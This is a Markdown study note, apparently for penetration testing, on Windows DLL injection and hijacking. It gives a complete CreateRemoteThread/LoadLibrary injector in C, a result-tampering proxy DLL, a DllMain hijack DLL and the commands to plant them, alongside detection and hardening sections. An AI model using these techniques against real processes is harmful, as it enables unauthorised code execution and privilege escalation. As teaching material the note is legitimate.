
# Windows Privilege Escalation – DLL Injection and DLL Hijacking

## Overview

DLL injection is a technique that inserts code, structured as a Dynamic Link Library, into a running process.

Once injected, the DLL runs inside the target process context. This allows the injected code to:

- influence process behavior
- access process resources
- execute with the process token
- interact with the process memory space
- modify function behavior
- evade simplistic process-based detection

DLL injection and DLL hijacking can be used legitimately, but they are also common attacker techniques.

> [!important]
> DLL injection is not inherently malicious. The impact depends on the target process, the execution context, and what the injected code does.

---

# Legitimate Uses

DLL injection and related loading techniques can be used for legitimate engineering purposes, including:

- hot patching
- debugging
- instrumentation
- application monitoring
- compatibility shims
- runtime feature extension

Example legitimate use:

```text
Hot patching allows code updates without immediately restarting a running process.
```

---

# Offensive Relevance

Attackers abuse DLL loading behavior to:

- execute code inside trusted processes
- evade some security tooling
- inherit a privileged process context
- hijack application functionality
- persist through application load paths
- execute payloads when services or applications start

If the target process runs as a privileged user or service account, DLL abuse may lead to privilege escalation.

---

# Technique Categories

This note covers:

- `LoadLibrary` injection
- manual mapping
- reflective DLL injection
- DLL hijacking
- DLL proxying
- invalid / missing DLL hijacking
- DLL search order analysis with Process Monitor

---

# Method 1 – LoadLibrary

## Overview

`LoadLibrary` is a Windows API function used to load a DLL into a process.

The API loads a Dynamic Link Library into the current process memory and returns a handle that can be used to resolve exported functions.

Common supporting APIs:

| API | Purpose |
|---|---|
| `LoadLibrary` / `LoadLibraryA` | Load a DLL |
| `GetProcAddress` | Resolve exported function addresses |
| `OpenProcess` | Obtain a process handle |
| `VirtualAllocEx` | Allocate memory in a remote process |
| `WriteProcessMemory` | Write data into a remote process |
| `CreateRemoteThread` | Start execution in a remote process |

---

# Legitimate LoadLibrary Example

This example loads a DLL into the current process.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```

## What Happens

1. The program calls `LoadLibrary("example.dll")`.
2. Windows searches for the DLL using the configured DLL search order.
3. If found, the DLL is mapped into the current process.
4. The DLL entry point may execute.
5. A module handle is returned.

---

# LoadLibrary Remote Injection Workflow

## Attack Concept

A common DLL injection pattern uses `CreateRemoteThread` to make a target process call `LoadLibraryA`.

High-level workflow:

```text
Open target process
↓
Allocate memory in target process
↓
Write DLL path into target memory
↓
Resolve LoadLibraryA address
↓
Create remote thread starting at LoadLibraryA
↓
Target process loads DLL
```

---

# LoadLibrary Injection Example

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456; // The ID of the target process
    char dllPath[] = "C:\\Path\\To\\example.dll";

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(
        hProcess,
        NULL,
        strlen(dllPath),
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    );

    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(
        hProcess,
        dllPathAddressInRemoteMemory,
        dllPath,
        strlen(dllPath),
        NULL
    );

    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(
        GetModuleHandle("kernel32.dll"),
        "LoadLibraryA"
    );

    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddress,
        dllPathAddressInRemoteMemory,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```

> [!note]
> The source code requires a valid `dllPath` variable and a semicolon after the `targetProcessId` assignment. Those are included here so the snippet is syntactically coherent.

---

# Detection Notes – LoadLibrary Injection

Common telemetry indicators:

- `OpenProcess` against another process
- `VirtualAllocEx`
- `WriteProcessMemory`
- `CreateRemoteThread`
- suspicious DLL path written into remote memory
- DLL loaded from user-writable directories
- cross-process access to high-value processes

---

# Method 2 – Manual Mapping

## Overview

Manual mapping is an advanced DLL injection method that loads a DLL into a target process without using the normal `LoadLibrary` flow.

It manually performs loader-like work, including:

- mapping DLL sections
- resolving imports
- applying relocations
- handling TLS callbacks
- calling the DLL entry point

Because it avoids `LoadLibrary`, it may evade detections that focus only on standard DLL loading APIs.

---

# Manual Mapping Workflow

Simplified process:

1. Load the DLL as raw data into the injector process.
2. Allocate memory in the target process.
3. Map the DLL sections into the target process.
4. Inject loader shellcode into the target process.
5. Execute the loader shellcode.
6. Loader shellcode performs relocations.
7. Loader shellcode resolves imports.
8. Loader shellcode executes TLS callbacks.
9. Loader shellcode calls `DllMain`.

---

# Why Manual Mapping Is Harder to Detect

Manual mapping may avoid:

- normal `LoadLibrary` telemetry
- standard loader bookkeeping
- easy module list visibility
- simple loaded-module detections

> [!important]
> Manual mapping is complex and error-prone. Incorrect import resolution, relocation handling, or TLS behavior can crash the target process.

---

# Method 3 – Reflective DLL Injection

## Overview

Reflective DLL injection loads a DLL from memory into a host process.

The DLL contains its own loader, usually exported as a function such as:

```text
ReflectiveLoader
```

Instead of depending fully on the Windows loader, the DLL parses and loads itself.

---

# Reflective DLL Injection Workflow

Assume:

- code execution already exists inside the host process
- the DLL has been written into an arbitrary memory location in that process

Reflective loading proceeds as follows:

1. Execution transfers to the DLL’s `ReflectiveLoader` export.
2. The loader finds its own current memory location.
3. It parses its own PE headers.
4. It locates required APIs from `kernel32.dll`, including:
   - `LoadLibraryA`
   - `GetProcAddress`
   - `VirtualAlloc`
5. It allocates memory for a clean loaded copy of itself.
6. It copies headers and sections into the new memory region.
7. It resolves imports.
8. It applies relocations.
9. It executes TLS callbacks, if present.
10. It calls `DllMain` with:

```text
DLL_PROCESS_ATTACH
```

11. Execution returns to the bootstrap shellcode or the remote thread exits.

---

# Reflective Injection Characteristics

Advantages:

- loads from memory
- minimizes disk interaction
- does not require a normal DLL path
- can reduce host interaction
- useful for in-memory tooling

Detection opportunities:

- suspicious memory allocations
- executable memory regions
- PE headers in private memory
- unusual thread start addresses
- API resolution behavior
- memory regions not backed by normal modules

---

# Method 4 – DLL Hijacking

## Overview

DLL hijacking abuses how Windows searches for DLLs.

If an application loads a DLL without specifying a full path, Windows searches multiple directories. If an attacker can place a malicious DLL earlier in the search order than the legitimate one, the application may load the attacker-controlled DLL.

Typical escalation condition:

```text
Privileged app/service loads DLL by name
↓
Writable directory exists in DLL search path
↓
Attacker plants DLL
↓
Privileged app/service starts
↓
Attacker DLL executes in privileged context
```

---

# Safe DLL Search Mode

Windows DLL search order depends on whether `SafeDllSearchMode` is enabled.

The registry value is located at:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\SafeDllSearchMode
```

Values:

| Value | Meaning |
|---|---|
| `1` | Safe DLL Search Mode enabled |
| `0` | Safe DLL Search Mode disabled |

Safe DLL Search Mode is enabled by default.

---

# Enable or Disable Safe DLL Search Mode

Manual steps:

1. Press `Windows + R`.
2. Run `regedit`.
3. Navigate to:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
```

4. Locate or create:

```text
SafeDllSearchMode
```

5. Set value:
   - `1` to enable
   - `0` to disable
6. Reboot for the change to take effect.

> [!warning]
> Disabling Safe DLL Search Mode weakens system security and can make DLL hijacking easier.

---

# DLL Search Order – Safe DLL Search Mode Enabled

When Safe DLL Search Mode is enabled, the search order is:

1. The directory from which the application is loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. Directories listed in the `PATH` environment variable.

---

# DLL Search Order – Safe DLL Search Mode Disabled

When Safe DLL Search Mode is disabled, the current directory is searched earlier:

1. The directory from which the application is loaded.
2. The current directory.
3. The system directory.
4. The 16-bit system directory.
5. The Windows directory.
6. Directories listed in the `PATH` environment variable.

---

# Finding DLL Hijacking Opportunities

## Tools

Useful tools:

| Tool | Use |
|---|---|
| Process Monitor | Observe DLL load attempts and `NAME NOT FOUND` results |
| Process Explorer | Inspect running processes and loaded DLLs |
| PE Explorer | Inspect PE imports and DLL dependencies |
| Disassemblers / Debuggers | Identify function signatures and behavior |

---

# Process Monitor Workflow

Use Process Monitor to observe DLL loading behavior.

Recommended filters:

| Filter | Value |
|---|---|
| `Process Name` | target executable, such as `main.exe` |
| `Operation` | `Load Image` |
| `Path` | ends with `.dll` |
| `Result` | `NAME NOT FOUND`, for missing DLL checks |

> [!tip]
> Process Monitor only captures events while it is running. Start Procmon before launching the target application.

---

# Practical Example – DLL Loaded from Application Directory

## Vulnerable Program Behavior

The example program loads:

```text
library.dll
```

with:

```cpp
LoadLibrary("library.dll")
```

Since no full path is specified, Windows searches for the DLL according to the DLL search order.

---

# Example Program

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }

    HMODULE hLibrary2 = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    if (hLibrary2 != NULL)
    {
        FreeLibrary(hLibrary2);
    }

    system("pause");
    return 0;
}
```

> [!note]
> The original sample repeats the `hLibrary` variable name when loading `x.dll`. This version uses `hLibrary2` so the example is coherent.

---

# Process Monitor – Load Image Evidence

Filter for:

```text
Operation is Load Image
Process Name is main.exe
```

Example output:

```text
16:13:30,0074709    main.exe    47792   Load Image  C:\Users\PandaSt0rm\Desktop\Hijack\main.exe SUCCESS Image Base: 0xf60000, Image Size: 0x26000
16:13:30,0075369    main.exe    47792   Load Image  C:\Windows\System32\ntdll.dll   SUCCESS Image Base: 0x7ffacdbf0000, Image Size: 0x214000
16:13:30,0075986    main.exe    47792   Load Image  C:\Windows\SysWOW64\ntdll.dll   SUCCESS Image Base: 0x77a30000, Image Size: 0x1af000
16:13:30,0120867    main.exe    47792   Load Image  C:\Windows\System32\wow64.dll   SUCCESS Image Base: 0x7ffacd5a0000, Image Size: 0x57000
16:13:30,0122132    main.exe    47792   Load Image  C:\Windows\System32\wow64base.dll   SUCCESS Image Base: 0x7ffacd370000, Image Size: 0x9000
16:13:30,0123231    main.exe    47792   Load Image  C:\Windows\System32\wow64win.dll    SUCCESS Image Base: 0x7ffacc750000, Image Size: 0x8b000
16:13:30,0124204    main.exe    47792   Load Image  C:\Windows\System32\wow64con.dll    SUCCESS Image Base: 0x7ffacc850000, Image Size: 0x16000
16:13:30,0133468    main.exe    47792   Load Image  C:\Windows\System32\wow64cpu.dll    SUCCESS Image Base: 0x77a20000, Image Size: 0xa000
16:13:30,0144586    main.exe    47792   Load Image  C:\Windows\SysWOW64\kernel32.dll    SUCCESS Image Base: 0x76460000, Image Size: 0xf0000
16:13:30,0146299    main.exe    47792   Load Image  C:\Windows\SysWOW64\KernelBase.dll  SUCCESS Image Base: 0x75dd0000, Image Size: 0x272000
16:13:31,7974779    main.exe    47792   Load Image  C:\Users\PandaSt0rm\Desktop\Hijack\library.dll  SUCCESS Image Base: 0x6a1a0000, Image Size: 0x1d000
```

Important observation:

```text
C:\Users\PandaSt0rm\Desktop\Hijack\library.dll
```

The application loads `library.dll` from the same directory as the executable.

---

# Method 5 – DLL Proxying

## Overview

DLL proxying creates a malicious replacement DLL that forwards calls to the original DLL while modifying behavior.

Typical workflow:

```text
Original DLL → renamed to backup name
Proxy DLL → given original DLL name
Application loads proxy DLL
Proxy DLL loads original DLL
Proxy DLL forwards or modifies function calls
```

This is useful when the target application expects specific exported functions.

---

# DLL Proxying Workflow

1. Identify the DLL the application loads.
2. Identify exported functions used by the application.
3. Rename the original DLL.
4. Create a proxy DLL using the original DLL name.
5. In the proxy DLL:
   - load the renamed original DLL
   - resolve the original function
   - optionally modify arguments or return values
   - return results to the application
6. Run the application and confirm modified behavior.

---

# Example Proxy Goal

The application calls:

```text
Add(int, int)
```

from:

```text
library.dll
```

The proxy DLL will:

1. Load the original renamed DLL:

```text
library.o.dll
```

2. Resolve the original `Add` function.
3. Call the original function.
4. Add `1` to the result.
5. Return the modified result.

---

# Proxy DLL Code

```cpp
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");

            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);

            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;

            printf("============ RETURN ============\n");

            // Return the tampered result
            return result;
        }
    }

    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

## Proxy Setup

Rename the original library:

```text
library.dll → library.o.dll
```

Rename the proxy DLL:

```text
tamper.dll → library.dll
```

Run:

```text
main.exe
```

Expected behavior:

```text
Input: 1 and 1
Original result: 2
Tampered result: 3
```

---

# Method 6 – Invalid / Missing DLL Hijacking

## Overview

Another DLL hijacking technique targets a DLL the application attempts to load but cannot find.

If the application searches a writable directory for the missing DLL, an attacker can place a crafted DLL there.

This can require less reverse engineering than proxying because the application may not rely on exported functions from the missing DLL.

---

# Finding Missing DLLs with Process Monitor

Use filters such as:

```text
Process Name is main.exe
Path ends with .dll
Result is NAME NOT FOUND
```

Interesting event:

```text
17:55:39,7848570    main.exe    37940   CreateFile  C:\Users\PandaSt0rm\Desktop\Hijack\x.dll    NAME NOT FOUND  Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
```

Important target:

```text
C:\Users\PandaSt0rm\Desktop\Hijack\x.dll
```

The application attempts to load `x.dll` from the application directory but fails.

If this directory is writable, placing a malicious DLL named `x.dll` may execute code when the application starts.

---

# Missing DLL Hijack Code

This example uses `DllMain`, which Windows calls when the DLL is loaded.

```cpp
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}
```

## Setup

Rename the compiled DLL:

```text
hijack.dll → x.dll
```

Place it where the application searches:

```text
C:\Users\PandaSt0rm\Desktop\Hijack\x.dll
```

Run:

```text
main.exe
```

Expected output:

```text
Hijacked... Oops...
```

The program still performs its normal addition logic, but the hijack DLL executes when loaded.

---

# Practical Decision Tree

## Are you analyzing DLL injection or DLL hijacking?

### DLL Injection

Look for cases where code is inserted into an already running process.

Common indicators:

```text
OpenProcess
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
LoadLibraryA
```

### DLL Hijacking

Look for cases where an application loads or searches for DLLs by name or from insecure locations.

Common indicators:

```text
Load Image
NAME NOT FOUND
DLL path in user-writable directory
DLL loaded from application directory
unqualified LoadLibrary call
```

---

## Is the target process privileged?

Check whether the process runs as:

```text
NT AUTHORITY\SYSTEM
Administrator
service account
high-integrity user
```

If the process is low privileged, hijacking may still prove code execution but may not escalate privileges.

---

## Is the DLL search location writable?

Check ACLs on the target directory.

```cmd
icacls "<directory_path>"
```

Writable locations of interest:

- application directory
- current working directory
- user profile directories
- writable PATH entries
- poorly permissioned vendor directories

---

## Does the target DLL require exports?

If the application calls specific exported functions, proxying may be required.

Use:

- PE Explorer
- dumpbin
- Ghidra
- IDA
- x64dbg
- Process Monitor
- Process Explorer

If the DLL is only loaded and not used, `DllMain` execution may be enough.

---

# Troubleshooting

## DLL does not load

Possible causes:

- wrong architecture
- wrong filename
- wrong directory
- Safe DLL Search Mode affects search order
- DLL blocked by security tooling
- target app uses full path
- target app uses `SetDllDirectory`
- target app has manifest or side-by-side loading
- missing dependencies in the malicious DLL

---

## Application crashes after hijack

Possible causes:

- expected exports are missing
- function signatures are wrong
- calling convention mismatch
- proxy DLL does not forward required functions
- original DLL was not loaded correctly
- DLL architecture mismatch
- DllMain performs unsafe operations

---

## Proxying fails

Check:

- original DLL was renamed correctly
- proxy DLL uses the original DLL name
- exported function names match exactly
- function prototypes match
- original function is resolved with `GetProcAddress`
- target app is loading the proxy DLL, not another copy

---

## Missing DLL hijack does not trigger

Possible causes:

- Procmon capture was stale
- DLL load attempt happens only under specific feature usage
- app was not restarted after DLL placement
- path is not writable
- app now finds DLL elsewhere earlier in search order
- missing DLL is optional and no code path triggers load

---

# Command / Tool Reference

## Check DLL search-related registry value

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
```

## Check directory permissions

```cmd
icacls "<directory_path>"
```

## Process Monitor useful filters

```text
Process Name is <target_process>
Operation is Load Image
Path ends with .dll
Result is NAME NOT FOUND
```

## Process Explorer use case

```text
Inspect process properties → loaded DLLs/modules
```

## PE Explorer use case

```text
Open executable → inspect imported DLLs and functions
```

## Rename original DLL for proxying

```cmd
ren library.dll library.o.dll
```

## Rename proxy DLL into target name

```cmd
ren tamper.dll library.dll
```

## Rename hijack DLL into missing DLL name

```cmd
ren hijack.dll x.dll
```

---

# Cleanup Checklist

Remove planted DLLs:

```text
library.dll
x.dll
```

Restore original DLL names:

```text
library.o.dll → library.dll
```

Remove compiled artifacts:

```text
tamper.dll
hijack.dll
test source files
temporary logs
```

Clear or archive Procmon captures according to engagement rules.

Document:

- target process
- DLL name
- DLL search path
- writable directory
- privilege context
- proof of execution
- exported functions affected
- cleanup performed

---

# Defensive Notes

## Detection Opportunities

Monitor for:

- DLL loads from user-writable directories
- DLL loads from temporary directories
- unexpected DLL loads by privileged services
- `CreateRemoteThread` into another process
- remote memory allocation
- suspicious `WriteProcessMemory`
- unsigned DLLs loaded by trusted applications
- `NAME NOT FOUND` DLL probing followed by successful load
- service start followed by unusual DLL load

---

## Hardening Controls

Consider:

- fully qualifying DLL paths in application code
- enabling Safe DLL Search Mode
- using secure DLL loading functions and flags
- removing writable directories from privileged app search paths
- applying least privilege to application directories
- using application control such as WDAC or AppLocker
- signing and validating DLLs
- monitoring module loads
- keeping third-party software updated
- restricting write access to service directories

---

# Key Takeaways

- DLL injection places code inside another running process.
- `LoadLibrary` injection commonly uses `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`.
- Manual mapping loads a DLL without relying on the normal `LoadLibrary` path.
- Reflective DLL injection uses a self-loading DLL with a reflective loader.
- DLL hijacking abuses Windows DLL search order.
- Safe DLL Search Mode changes where the current directory appears in the search order.
- Process Monitor is useful for finding DLL load attempts and missing DLLs.
- DLL proxying forwards calls to the original DLL while modifying behavior.
- Missing DLL hijacking may only require a `DllMain` payload if no exports are needed.
- Exploitability depends on write permissions, search order, target process context, and application behavior.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[DLL Hijacking]]
- [[DLL Injection]]
- [[Windows Internals]]
- [[LoadLibrary]]
- [[CreateRemoteThread]]
- [[Manual Mapping]]
- [[Reflective DLL Injection]]
- [[Process Monitor]]
- [[Process Explorer]]
- [[Safe DLL Search Mode]]
- [[Access Control Lists]]
- [[AppLocker]]
- [[WDAC]]

---

# Tags

#windows
#privilege-escalation
#dll-injection
#dll-hijacking
#dll-proxying
#loadlibrary
#manual-mapping
#reflective-dll-injection
#procmon
#process-monitor
#safe-dll-search-mode
#windows-internals
#pentesting